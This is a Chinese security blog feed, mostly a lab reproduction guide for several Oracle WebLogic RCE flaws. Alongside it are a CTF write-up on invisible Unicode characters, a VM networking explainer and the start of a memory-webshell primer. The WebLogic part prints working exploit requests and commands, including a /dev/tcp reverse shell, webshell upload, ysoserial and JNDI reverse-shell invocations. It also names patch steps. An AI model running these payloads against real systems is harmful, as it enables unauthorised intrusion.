href="#4、漏洞复现" class="headerlink" title="4、漏洞复现"></a>4、漏洞复现</h3><p>首页如图，漏洞不在首页</p><p><img src="/img/VulnRep-WebLogic/image-20240516155424032.png" alt="image-20240516155424032"></p><p>我们需要POST提交到<code>/wls-wsat/CoordinatorPortType</code>，并配合XMLDecoder 解析xml 数据，在解析过程中存在反序列化漏洞，造成命令执行。</p><p>命令反弹整体报文如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 192.168.31.51:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 633</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/攻击机的IP/监听的端口 0&amp;gt;&amp;amp;1&lt;/string&gt; </span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p>由于我此时环境准备不够充分，在此只展示webshell 写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 81.70.248.223:7002</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 1164</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">     &lt;soapenv:Header&gt;</span><br><span class="line">     &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">     &lt;java&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">     &lt;object class=&quot;java.io.PrintWriter&quot;&gt;      &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test4.jsp&lt;/string&gt;</span><br><span class="line">     &lt;void method=&quot;println&quot;&gt;&lt;string&gt;</span><br><span class="line">     &lt;![CDATA[</span><br><span class="line"> /*冰蝎马的文件内容*/</span><br><span class="line">     ]]&gt;</span><br><span class="line">     &lt;/string&gt;</span><br><span class="line">     &lt;/void&gt;</span><br><span class="line">     &lt;void method=&quot;close&quot;/&gt;</span><br><span class="line">     &lt;/object&gt;&lt;/java&gt;&lt;/java&gt;</span><br><span class="line">     &lt;/work:WorkContext&gt;</span><br><span class="line">     &lt;/soapenv:Header&gt;</span><br><span class="line">     &lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>文件写入在<code>/bea_wls_internal/test4.jsp</code>中，用冰蝎进行连接</p><p><img src="/img/VulnRep-WebLogic/image-20240516162202590.png" alt="image-20240516162202590"></p><h3 id="5、漏洞修复"><a href="#5、漏洞修复" class="headerlink" title="5、漏洞修复"></a>5、漏洞修复</h3><p>方法一：删除wls-wsat组件，然后重启weblogic</p><p>方法二：官网下载，打补丁</p><h2 id="三、WebLogic反序列化漏洞（CVE-2018-2628）"><a href="#三、WebLogic反序列化漏洞（CVE-2018-2628）" class="headerlink" title="三、WebLogic反序列化漏洞（CVE-2018-2628）"></a>三、WebLogic反序列化漏洞（CVE-2018-2628）</h2><h3 id="1、漏洞原因-1"><a href="#1、漏洞原因-1" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>WebLogic 的T3协议是WebLogic 与Java 之间进行通讯的一个基于Java RMI远程方法调用的一个协议，攻击者可以通过T3协议发送恶意的的反序列化数据，进行反序列化，实现对存在漏洞的weblogic组件的远程代码执行攻击。</p><h3 id="2、漏洞影响-1"><a href="#2、漏洞影响-1" class="headerlink" title="2、漏洞影响"></a>2、漏洞影响</h3><p>T3协议在开放WebLogic控制台端口的应用上默认开启，攻击者可以通过T3协议发送恶意的的反序列化数据，利用RMI（远程方法调用）机制的缺陷，通过JRMP协议（java 远程消息交换协议）导致未授权用户在远程服务器执行任意命令。</p><h3 id="3、漏洞涉及版本-1"><a href="#3、漏洞涉及版本-1" class="headerlink" title="3、漏洞涉及版本"></a>3、漏洞涉及版本</h3><ol><li>Oracle WebLogic Server 10.3.6.0</li><li>Oracle WebLogic Server 12.1.3.0</li><li>Oracle WebLogic Server 12.2.1.2</li><li>Oracle WebLogic Server 12.2.1.3</li></ol><h3 id="4、漏洞复现-1"><a href="#4、漏洞复现-1" class="headerlink" title="4、漏洞复现"></a>4、漏洞复现</h3><p>可先通过nmap脚本<code>–script=weblogic-t3-info</code> 查看weblogic版本信息和t3协议是否开启</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -A -T4 -p 7001 IP</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-WebLogic/image-20240516171815911.png" alt="image-20240516171815911"></p><p>看到T3协议在使用，并且WebLogic 的版本信息为：10.3.6.0</p><p>查看<code>console</code> 路径</p><p><img src="/img/VulnRep-WebLogic/image-20240516172014110.png" alt="image-20240516172014110"></p><p>这里使用：<a href="https://github.com/Lighird/CVE-2018-2628">CVE-2018-2628漏洞工具包</a></p><p>1、利用 <code>ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</code>启动一个JRMP Server</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 8080 CommonsCollections1 &#x27;touch /tmp/test.txt&#x27;</span><br><span class="line">&#x27;touch /tmp/test.txt&#x27;为我想执行的命令，8080是JRMP Server监听的端口。</span><br></pre></td></tr></table></figure><p>2、下载对应的exp：<a href="https://www.exploit-db.com/exploits/44553">https://www.exploit-db.com/exploits/44553</a></p><p><img src="/img/VulnRep-WebLogic/image-20240516175658008.png" alt="image-20240516175658008"></p><p>3、修改名称并启动exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mv 44553 44553.py</span><br><span class="line"></span><br><span class="line">python 44553.py 172.24.0.2 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 192.168.100.34 8080 JRMPClient</span><br></pre></td></tr></table></figure><p>4、进入docker容器可以看到存在<code>test.txt</code>文件</p><p><img src="/img/VulnRep-WebLogic/image-20240516180201425.png" alt="image-20240516180201425"></p><h3 id="5、漏洞修复-1"><a href="#5、漏洞修复-1" class="headerlink" title="5、漏洞修复"></a>5、漏洞修复</h3><ol><li>关闭T3服务，或控制T3服务的访问权限(临时)。</li><li>打官方补丁。</li></ol><h2 id="四、任意文件上传漏洞（CVE-2018-2894）"><a href="#四、任意文件上传漏洞（CVE-2018-2894）" class="headerlink" title="四、任意文件上传漏洞（CVE-2018-2894）"></a>四、任意文件上传漏洞（CVE-2018-2894）</h2><h3 id="1、漏洞原因-2"><a href="#1、漏洞原因-2" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>Weblogic管理端未授权的两个页面存在任意上传jsp文件漏洞，进而获取服务器权限。</p><p>CVE-2018-2894漏洞是由于WebLogic Server中的Web Service Test Page存在任意文件上传的缺陷。在“生产模式”下，默认不开启Web Service Test Page，因此该漏洞的利用存在一定限制。攻击者可以利用该漏洞上传任意JSP文件，进而可能获取服务器权限。</p><h3 id="2、漏洞影响-2"><a href="#2、漏洞影响-2" class="headerlink" title="2、漏洞影响"></a>2、漏洞影响</h3><p>利用CVE-2018-2894漏洞，攻击者可以上传恶意的JSP文件到服务器，这些文件可以作为webshell使用，允许攻击者远程执行代码，从而控制服务器。</p><h3 id="3、漏洞涉及版本-2"><a href="#3、漏洞涉及版本-2" class="headerlink" title="3、漏洞涉及版本"></a>3、漏洞涉及版本</h3><ol><li>Oracle WebLogic Server 10.3.6.0</li><li>Oracle WebLogic Server 12.1.3.0</li><li>Oracle WebLogic Server 12.2.1.2</li><li>Oracle WebLogic Server 12.2.1.3</li></ol><h3 id="4、漏洞复现-2"><a href="#4、漏洞复现-2" class="headerlink" title="4、漏洞复现"></a>4、漏洞复现</h3><p>1、未授权访问<code>/ws_utc/config.do</code>页面</p><p><img src="/img/VulnRep-WebLogic/image-20240516181742024.png" alt="image-20240516181742024"></p><p>由于在“生产模式”下，默认不开启Web Service Test Page，所以此处需要我们手动通过管理员登陆后台去开启。先看一下管理员账号密码：<code>weblogic: TvrG557m</code></p><p><img src="/img/VulnRep-WebLogic/image-20240516182023018.png" alt="image-20240516182023018"></p><p>2、在<code>/console</code>登录后台</p><p><img src="/img/VulnRep-WebLogic/image-20240516182201233.png" alt="image-20240516182201233"></p><p>3、在域结构中展开高级选项</p><p><img src="/img/VulnRep-WebLogic/image-20240517164549660.png" alt="image-20240517164549660"></p><p>勾选<code>启用Web服务测试页</code>后保存</p><p><img src="/img/VulnRep-WebLogic/image-20240517164637306.png" alt="image-20240517164637306"></p><p>4、回到未授权访问<code>/ws_utc/config.do</code>页面</p><p>将<code>当前的工作目录</code>修改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</span><br></pre></td></tr></table></figure><p>5、提交后来到安全，添加文件</p><p><img src="/img/VulnRep-WebLogic/image-20240517172013119.png" alt="image-20240517172013119"></p><p>提交webshell，BP拦截，在响应包的最下面找到对应的时间戳</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxx:7001/ws_utc/css/config/keystore/时间戳_22.jsp</span><br></pre></td></tr></table></figure><p>即可连接成功</p><h3 id="5、漏洞修复-2"><a href="#5、漏洞修复-2" class="headerlink" title="5、漏洞修复"></a>5、漏洞修复</h3><ol><li>设置访问权限：确保 config.do 和 begin.do 页面在登录授权后才能访问，以防止未授权的文件上传尝试。</li><li>使用安全产品：考虑在入侵防御系统（IPS）等安全产品中加入相应的特征，以帮助检测和阻止利用此漏洞的尝试。</li><li>升级到最新版本：安装 Oracle 官方提供的最新补丁，以修复已知的安全漏洞。</li></ol><h2 id="五、WebLogic未授权命令执行漏洞（CVE-2020-14882）"><a href="#五、WebLogic未授权命令执行漏洞（CVE-2020-14882）" class="headerlink" title="五、WebLogic未授权命令执行漏洞（CVE-2020-14882）"></a>五、WebLogic未授权命令执行漏洞（CVE-2020-14882）</h2><h3 id="1、漏洞原因-3"><a href="#1、漏洞原因-3" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>CVE-2020-14882 漏洞是由于 Oracle WebLogic Server Console 中存在路径遍历漏洞，允许攻击者构造特殊的 HTTP 请求来绕过身份验证，从而访问并修改管理员控制台的某些资源。这可能导致远程代码执行（RCE）。</p><h3 id="2、漏洞影响-3"><a href="#2、漏洞影响-3" class="headerlink" title="2、漏洞影响"></a>2、漏洞影响</h3><ul><li>远程代码执行：攻击者可以在目标系统上执行任意代码，导致服务器被完全控制。</li><li>未经身份验证的访问：攻击者无需进行身份验证即可利用此漏洞。</li></ul><h3 id="3、漏洞涉及版本-3"><a href="#3、漏洞涉及版本-3" class="headerlink" title="3、漏洞涉及版本"></a>3、漏洞涉及版本</h3><ol><li>Oracle Weblogic Server 10.3.6.0.0</li><li>Oracle Weblogic Server 12.1.3.0.0</li><li>Oracle Weblogic Server 12.2.1.3.0</li><li>Oracle Weblogic Server 12.2.1.4.0</li><li>Oracle Weblogic Server 14.1.1.0.0</li></ol><h3 id="4、漏洞复现-3"><a href="#4、漏洞复现-3" class="headerlink" title="4、漏洞复现"></a>4、漏洞复现</h3><p>1、<code>http://xxx.xxx/console</code>这里是登录页面</p><p><img src="/img/VulnRep-WebLogic/image-20240517174515867.png" alt="image-20240517174515867"></p><p>2、构造poc未授权访问后台地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxx:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=AppDeploymentsControlPage&amp;handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-WebLogic/image-20240517175322311.png" alt="image-20240517175322311"></p><p>3、构造POC执行RCE</p><p>创建<code>/tmp/1.txt</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.136:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch%20/tmp/1.txt%27);%22)</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-WebLogic/image-20240517183753482.png" alt="image-20240517183753482"></p><p>进入容器查看，创建成功</p><h3 id="5、漏洞修复-3"><a href="#5、漏洞修复-3" class="headerlink" title="5、漏洞修复"></a>5、漏洞修复</h3><p>安装官方最新补丁进行升级：<a href="https://www.oracle.com/security-alerts/cpuapr2020.html">https://www.oracle.com/security-alerts/cpuapr2020.html</a></p><h2 id="六、Weblogic-远程代码执行漏洞（CVE-2023-21839）"><a href="#六、Weblogic-远程代码执行漏洞（CVE-2023-21839）" class="headerlink" title="六、Weblogic 远程代码执行漏洞（CVE 2023-21839）"></a>六、Weblogic 远程代码执行漏洞（CVE 2023-21839）</h2><h3 id="1、漏洞原因-4"><a href="#1、漏洞原因-4" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>WebLogic 存在远程代码执行漏洞（CVE-2023-21839&#x2F;CNVD-2023-04389），由于Weblogic IIOP&#x2F;T3协议存在缺陷，当IIOP&#x2F;T3协议开启时，允许未经身份验证的攻击者通过IIOP&#x2F;T3协议网络访问攻击存在安全风险的WebLogic Server。该漏洞涉及到 JNDI 注入，当 JDK 版本过低或者本地存在小工具时，可能导致远程代码执行。</p><h3 id="2、漏洞影响-4"><a href="#2、漏洞影响-4" class="headerlink" title="2、漏洞影响"></a>2、漏洞影响</h3><p>风险等级：奇安信 CERT 将此漏洞的风险等级评定为 “高危”，并给出了 CVSS 3.1 评分为 8.6。</p><h3 id="3、漏洞涉及版本-4"><a href="#3、漏洞涉及版本-4" class="headerlink" title="3、漏洞涉及版本"></a>3、漏洞涉及版本</h3><p>该漏洞影响以下版本的 Oracle WebLogic Server：</p><ol><li>Oracle WebLogic Server 10.3.6.0</li><li>Oracle WebLogic Server 12.2.1.2.0</li><li>Oracle WebLogic Server 12.2.1.1.0</li><li>Oracle WebLogic Server 12.2.1.3.0</li><li>Oracle WebLogic Server 12.2.1.0.0</li><li>Oracle WebLogic Server 12.2.1.4.0</li><li>Oracle WebLogic Server 14.1.1.0.0</li><li>Oracle WebLogic Server 12.1.2.0.0</li><li>Oracle WebLogic Server 12.1.3.0.0</li></ol><h3 id="4、漏洞复现-4"><a href="#4、漏洞复现-4" class="headerlink" title="4、漏洞复现"></a>4、漏洞复现</h3><p>1、使用nmap 探测有无开启T3协议</p><p><img src="/img/VulnRep-WebLogic/image-20240518150255335.png" alt="image-20240518150255335"></p><p>2、在这里使用POC</p><p>地址：<a href="https://github.com/4ra1n/CVE-2023-21839">https://github.com/4ra1n/CVE-2023-21839</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/4ra1n/CVE-2023-21839</span><br></pre></td></tr></table></figure><p>之后对main.go 进行编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd cmd</span><br><span class="line">sudo apt install gccgo-go//安装go语言</span><br><span class="line">go build -o CVE-2023-21839</span><br></pre></td></tr></table></figure><p>3、开启监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//1、开启JNDI 监听</span><br><span class="line">java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 192.168.126.130</span><br><span class="line">//2、开启NC监听</span><br><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure><p>4、触发漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./CVE-2023-21839 -ip 192.168.126.128 -port 7001 -ldap ldap://192.168.126.130:1389/Basic/ReverseShell/192.168.126.130/1234</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-WebLogic/image-20240518153723.png" alt="image-20240518153723.png"></p><p>获取shell</p><h3 id="5、漏洞修复-4"><a href="#5、漏洞修复-4" class="headerlink" title="5、漏洞修复"></a>5、漏洞修复</h3><p>1、Oracle 在 2023 年 1 月的安全公告中修复了这个漏洞，补丁下载链接：<a href="https://support.oracle.com/rs?type=doc&id=2917213.2">https://support.oracle.com/rs?type=doc&amp;id=2917213.2</a></p><p>2、缓解方式：禁用 T3 及 IIOP</p>]]></content>
      
      
      <categories>
          
          <category> 复现与审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WebLogic系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CTF竞赛】[NISACTF 2022]checkin—看不见的字符</title>
      <link href="/2024/05/17/CTF-competition-Invisible-characters/"/>
      <url>/2024/05/17/CTF-competition-Invisible-characters/</url>
      
        <content type="html"><![CDATA[<h1 id="【CTF竞赛】-NISACTF-2022-checkin—看不见的字符"><a href="#【CTF竞赛】-NISACTF-2022-checkin—看不见的字符" class="headerlink" title="【CTF竞赛】[NISACTF 2022]checkin—看不见的字符"></a>【CTF竞赛】[NISACTF 2022]checkin—看不见的字符</h1><h2 id="一、看题"><a href="#一、看题" class="headerlink" title="一、看题"></a>一、看题</h2><p>当我们复制的时候会变成这样</p><p><img src="/img/CTF-competition-Invisible-characters/image-20240517210427329.png" alt="image-20240517210427329"></p><p>把这个代码全部复制粘贴到php文件中去，发现有好多奇怪的字符导致我们不能以正常思路去看待代码</p><p><img src="/img/CTF-competition-Invisible-characters/image-20240517210613255.png" alt="image-20240517210613255"></p><h2 id="二、解题"><a href="#二、解题" class="headerlink" title="二、解题"></a>二、解题</h2><h3 id="1、获取参数名"><a href="#1、获取参数名" class="headerlink" title="1、获取参数名"></a>1、获取参数名</h3><p>将PHP文件到 010 或者 WinHex 中打开</p><p>复制我们需要数据的十六进制代码，如：我们需要知道GET接收的参数名到底是谁</p><p><img src="/img/CTF-competition-Invisible-characters/image-20240517210814023.png" alt="image-20240517210814023"></p><p>在十六进制的前面都加上一个%，就是我们需要要提交的参数名了</p><p><img src="/img/CTF-competition-Invisible-characters/image-20240517211213521.png" alt="image-20240517211213521"></p><h3 id="2、获取参数值"><a href="#2、获取参数值" class="headerlink" title="2、获取参数值"></a>2、获取参数值</h3><p>同样的方法获取需要的参数值</p><p><img src="/img/CTF-competition-Invisible-characters/image-20240517211626414.png" alt="image-20240517211626414"></p><p><img src="/img/CTF-competition-Invisible-characters/image-20240517211615280.png" alt="image-20240517211615280"></p><h3 id="3、传参"><a href="#3、传参" class="headerlink" title="3、传参"></a>3、传参</h3><p>结合起来加上前面的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ahahahaha=jitanglailo&amp;%E2%80%AE%E2%81%A6%55%67%65%69%77%6F%E2%81%A9%E2%81%A6%63%75%69%73%68%69%79%75%61%6E=%E2%80%AE%E2%81%A6%20%46%6C%61%67%21%E2%81%A9%E2%81%A6%4E%31%53%41%43%54%46</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【基础知识】简述虚拟机的三种网络连接模式</title>
      <link href="/2024/05/11/Nouns-Virtual-Machine-Network/"/>
      <url>/2024/05/11/Nouns-Virtual-Machine-Network/</url>
      
        <content type="html"><![CDATA[<h1 id="【基础知识】简述虚拟机的三种网络连接模式"><a href="#【基础知识】简述虚拟机的三种网络连接模式" class="headerlink" title="【基础知识】简述虚拟机的三种网络连接模式"></a>【基础知识】简述虚拟机的三种网络连接模式</h1><p>网络安全中，虚拟机是必不可少的存在，了解虚拟机的网络连接模式是很有必要的。但网上对此的讲解过于繁琐和难以理解，在此用图和简短的语句写下本人的理解，以帮助刚入行的同学快速掌握。</p><h2 id="一、桥接模式"><a href="#一、桥接模式" class="headerlink" title="一、桥接模式"></a>一、桥接模式</h2><p>类似虚拟出来一个交换机（Vmnet0），同时把物理主机和所有的桥接虚拟机都插在这个交换机中，此时桥接模式的虚拟机和主机同处一个网段且子网掩码、网关与DNS都与主机一模一样。</p><p>看如图：</p><p><img src="/img/Nouns-Virtual-Machine-Network/%E8%99%9A%E6%8B%9F%E6%9C%BA-%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F.png" alt="虚拟机-桥接模式"></p><p>简而言之：桥接类型的虚拟机和主机一起同处一个局域网中，与主机使用的相同的网卡、子网掩码、网关、DNS。此时，主机可以访问互联网，虚拟机也可以访问到互联网。</p><h2 id="二、NAT模式"><a href="#二、NAT模式" class="headerlink" title="二、NAT模式"></a>二、NAT模式</h2><p>相当于NAT模式的虚拟机是连接在交互机（Vmnet8）上面的，而主机的VMWare Network Adapter Vmnet8也会连接到Vmnet8，用来主机跟NAT虚拟机通讯；此时NAT虚拟机可以通过宿主主机所在的网络访问互联网、以及宿主主机能访问到的一切网络。</p><p>看如图：</p><p><img src="/img/Nouns-Virtual-Machine-Network/%E8%99%9A%E6%8B%9F%E6%9C%BA-NAT%E6%A8%A1%E5%BC%8F.png" alt="虚拟机-NAT模式"></p><p>简而言之：NAT类型的虚拟机使用的是主机的网卡，可以来理解为“主机肚子里的蛔虫”。此时，主机如何上网，虚拟机就如何上网，主机能访问到的机器，虚拟机也能访问的到。但是主机之外的其他机器是不能访问到NAT机器的。</p><h2 id="三、仅主机模式"><a href="#三、仅主机模式" class="headerlink" title="三、仅主机模式"></a>三、仅主机模式</h2><p>与NAT模式差不多，但是是使用VMware Network Adapter VMnet1虚拟网卡连接VMnet1虚拟交换机来与虚拟机通信的，且与外网隔离，不能上网，使仅主机模式的虚拟机成为被外界隔离的主机。当然，此时除了主机能访问到之外，NAT利用主机能访问的机器也能访问到的特性，也是可以访问仅主机机器的；但是仅主机机器是访问不到NAT虚拟机的。</p><p>看如图：</p><p><img src="/img/Nouns-Virtual-Machine-Network/%E8%99%9A%E6%8B%9F%E6%9C%BA-%E4%BB%85%E4%B8%BB%E6%9C%BA%E6%A8%A1%E5%BC%8F.png" alt="虚拟机-仅主机模式"></p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 虚拟机网络连接模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内存马】JavaWeb 内存马初识与检测</title>
      <link href="/2024/04/29/Red-Team-Invasion-Memory-Horse/"/>
      <url>/2024/04/29/Red-Team-Invasion-Memory-Horse/</url>
      
        <content type="html"><![CDATA[<h1 id="【内存马】JavaWeb-内存马初识与检测"><a href="#【内存马】JavaWeb-内存马初识与检测" class="headerlink" title="【内存马】JavaWeb 内存马初识与检测"></a>【内存马】JavaWeb 内存马初识与检测</h1><h1 id="一、内存马初识"><a href="#一、内存马初识" class="headerlink" title="一、内存马初识"></a>一、内存马初识</h1><p>随着攻防演练越演越烈，流量分析、EDR、WAF、防护软件等越来越多的设备被广泛使用，传统的基于文件上传式的webshell 已经越来越容易被检测到，在这些安全设备面前几乎无处遁形。</p><p>Webshell内存马，是在内存中写入恶意后门和木马并执行，达到远程控制Web服务器的一类内存马，采用无文件的方法直接注入到内存中，控制服务器。不需要依赖于文件，从而躲避杀软，给检测带来巨大的难度。</p><h1 id="二、内存马的分类"><a href="#二、内存马的分类" class="headerlink" title="二、内存马的分类"></a>二、内存马的分类</h1><ol><li>Servlet型内存马：Servlet、Filter、Listener</li><li>框架类型内存马：Spring Controller、Interceptor</li><li>Agent类型内存马</li><li>其他……</li></ol><h1 id="三、Servlet-类型"><a href="#三、Servlet-类型" class="headerlink" title="三、Servlet 类型"></a>三、Servlet 类型</h1><h2 id="1、Java-Web-三大组件介绍"><a href="#1、Java-Web-三大组件介绍" class="headerlink" title="1、Java Web 三大组件介绍"></a>1、Java Web 三大组件介绍</h2><p>Servlet、Filter、Listener 是JavaWeb 的三大组件，有关这三个组件如下进行简单的说明：</p><ol><li>Servlet：处理http 请求的业务逻辑。</li><li>Filter：对http的请求进行过滤，如敏感字符等。过滤完请求后再把请求转交给Servlet。</li><li>Listener：Javaweb中的监听器，如监听在线的用户访问量，统计网站的总访问量等。</li></ol><h2 id="2、三大组件的运行顺序"><a href="#2、三大组件的运行顺序" class="headerlink" title="2、三大组件的运行顺序"></a>2、三大组件的运行顺序</h2><p>当Javaweb 运行起来之后，Listener 最先进行监听直到Javaweb 停止运行，之后当有http请求的话，Filter 会对请求进行脱敏，再将请求转交给Servlet，Servlet处理完请求之后，响应再次来到Filter脱敏，之后返回给客户端。</p><h2 id="3、内存马的原理"><a href="#3、内存马的原理" class="headerlink" title="3、内存马的原理"></a>3、内存马的原理</h2><p>Servlet 类型的内存马的原理大同小异，其都会通过getServletContext() 函数获取”context“ 的属性值，并设置可修改的属性。之后定义filter 过滤器，拦截请求，检测请求参数中是否有木马参数，如cmd，若有，则执行木马命令，没有则正常放行。</p><h1 id="四、Spring-类型"><a href="#四、Spring-类型" class="headerlink" title="四、Spring 类型"></a>四、Spring 类型</h1><h2 id="1、Sprint小谈"><a href="#1、Sprint小谈" class="headerlink" title="1、Sprint小谈"></a>1、Sprint小谈</h2><p>Spring 可以简单看作是把Javaweb三大组件结合起来的框架，使用MVC架构 （Model、View、Controller）。此架构中HTTP 的最终请求是在Controller 中实现。</p><h2 id="2、Spring内存马"><a href="#2、Spring内存马" class="headerlink" title="2、Spring内存马"></a>2、Spring内存马</h2><p>跟Servlet 类型的差不多，都是拿到”context“ 